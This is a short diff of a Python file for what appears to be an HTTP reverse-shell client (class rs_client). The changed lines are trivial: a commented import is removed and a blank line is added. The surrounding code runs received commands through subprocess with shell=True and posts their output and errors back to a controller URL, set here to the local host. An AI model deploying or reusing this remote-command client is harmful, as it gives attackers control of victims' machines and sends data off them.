@@ -3,7 +3,6 @@ import time
 import requests
 import socket
 import os
-#from requests.api import request
 
 # This is for a localhost connection, change it in case you're gonna use a public IP or another in general.
 URL = 'http://' + socket.gethostbyname(socket.gethostname())
@@ -32,6 +31,7 @@ class rs_client:
 
         else:
             cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            
             # POST result or error.
             post_response = requests.post(url=URL, data=cmdPrompt.stdout.read() )
             post_response = requests.post(url=URL, data=cmdPrompt.stderr.read() ) 
